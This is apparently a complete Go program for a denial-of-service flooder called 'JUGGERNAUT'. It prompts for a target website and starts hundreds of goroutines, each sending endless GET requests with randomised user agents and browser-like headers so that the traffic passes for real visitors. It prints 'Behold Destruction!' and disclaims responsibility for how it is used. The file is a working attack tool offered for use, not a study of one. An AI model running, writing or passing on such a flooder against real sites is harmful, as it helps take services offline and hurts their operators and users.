package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"strings"

	// "net/http/httputil"
	"os"
	"strconv"
	"time"
)

var colorReset = string("\033[0m")
var colorRed = string("\033[31m")
var colorGreen = string("\033[32m")
var colorYellow = string("\033[33m")
var colorBlue = string("\033[34m")
var colorPurple = string("\033[35m")
var colorCyan = string("\033[36m")
var colorWhite = string("\033[37m")
var bold = string("\033[1m")
var notbold = string("\033[0m")

var agents []string = []string{}
var bannercolors []string = []string{colorRed, colorGreen, colorPurple, colorBlue, colorCyan}
var counter int = 0
var url, host string

var banner = `
     ██╗ ██╗   ██╗  ██████╗   ██████╗  ███████╗ ██████╗  ███╗   ██╗  █████╗  ██╗   ██╗ ████████╗
     ██║ ██║   ██║ ██╔════╝  ██╔════╝  ██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██║   ██║ ╚══██╔══╝
     ██║ ██║   ██║ ██║  ███╗ ██║  ███╗ █████╗   ██████╔╝ ██╔██╗ ██║ ███████║ ██║   ██║    ██║   
██   ██║ ██║   ██║ ██║   ██║ ██║   ██║ ██╔══╝   ██╔══██╗ ██║╚██╗██║ ██╔══██║ ██║   ██║    ██║   
╚█████╔╝ ╚██████╔╝ ╚██████╔╝ ╚██████╔╝ ███████╗ ██║  ██║ ██║ ╚████║ ██║  ██║ ╚██████╔╝    ██║   
 ╚════╝   ╚═════╝   ╚═════╝   ╚═════╝  ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝  ╚═════╝     ╚═╝   
 
`

func load_agents() {
	file, err := os.Open("agents.txt")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		agents = append(agents, str)
	}
}

func send_request() {

	for true {
		rand.Seed(time.Now().Unix())
		random_agent := rand.Int() % len(agents)
		client := &http.Client{}
		req, _ := http.NewRequest("GET", url, nil)
		// if err != nil {fmt.Println("error occured here")}
		req.Host = host
		req.Header.Set("User-Agent", agents[random_agent])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-us")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
		req.Header.Set("Connection", "Keep-Alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(120-110)+110))
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		_, err := client.Do(req)

		if err != nil {
			fmt.Println(err)
			continue
		}

		counter++

		// reqDump, _ := httputil.DumpRequestOut(req, true)
		// fmt.Println(string(reqDump))
	}
}

func main() {
	rand.Seed(time.Now().Unix())
	random_color := rand.Int() % len(bannercolors)
	var go_num int

	fmt.Printf("%s%s%s", bannercolors[random_color], banner, colorReset)
	fmt.Printf("%sNote: The request counter may not work properly on some websites%s\n\n", colorYellow, colorWhite)
	fmt.Printf("%s%sWARNING: I AM NOT RESPONSIBLE FOR YOUR ACTS%s%s\n\n", colorRed, bold, notbold, colorReset)

	load_agents()
	fmt.Printf("%sUser Agents loaded!%s\n\n", colorGreen, colorReset)

	fmt.Print("Enter the url of website you want to attack: ")
	fmt.Scanln(&url)

	host = url
	if strings.Contains(host, "https") {

		if strings.Contains(host, "www.") {
			host = strings.ReplaceAll(host, "https://", "")
		} else {
			host = strings.ReplaceAll(host, "https://", "www.")
		}
	} else if strings.Contains(host, "http") {
		if strings.Contains(host, "www.") {
			host = strings.ReplaceAll(host, "http://", "")
		} else {
			host = strings.ReplaceAll(host, "http://", "www.")
		}
	} else {
		fmt.Printf("%sA url with https or http was required!%s", colorRed, colorReset)
		os.Exit(0)
	}

	fmt.Printf("\r%sValidating url...%s", colorBlue, colorReset)

	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	_, err := client.Do(req)

	if err != nil {
		fmt.Printf("\r%sEither this url does not exist or the target refused to connect%s", colorRed, colorReset)
		os.Exit(0)
	} else {
		fmt.Printf("\r%sThe url is valid%s", colorGreen, colorWhite)
	}

	fmt.Print("\nEnter number of goroutines(default - 750): ")
	fmt.Scanln(&go_num)

	if go_num < 0 {
		fmt.Printf("%sgoroutines cannot be less than 1!%s", colorRed, colorReset)
		os.Exit(0)
	} else if go_num == 0 {
		go_num = 750
	}

	for i := 0; i <= go_num; i++ {
		go send_request()
	}
	
	fmt.Printf("\n%sAttack Started, Behold Destruction!%s", colorCyan, colorWhite)
	fmt.Println("\n")

	for true {
		fmt.Printf("\r%s%d%s requests sent%s", colorBlue, counter, colorGreen, colorReset)
		time.Sleep(time.Second * 1)
	}
}
